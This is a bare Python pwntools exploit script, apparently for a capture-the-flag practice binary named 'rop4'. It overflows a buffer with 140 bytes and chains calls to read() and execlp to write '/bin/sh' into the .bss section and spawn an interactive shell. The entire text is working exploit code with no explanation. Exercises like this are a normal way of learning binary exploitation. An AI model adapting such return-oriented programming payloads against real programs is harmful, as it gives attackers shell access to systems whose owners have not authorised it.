from pwn import *
 
s = process('./rop4')
e = ELF('./rop4')
 
execlp = 0x08053ab0
read = 0x08053d1f
 
pppr = 0x0804859c
 
payload = ""
payload += "A"*140
 
payload += p32(read)
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(7)
 
payload += p32(execlp)
payload += "AAAA"
payload += p32(e.bss())
payload += p32(e.bss())
payload += p32(0)
 
s.sendline(payload)
 
s.sendline("/bin/sh")
 
s.interactive()
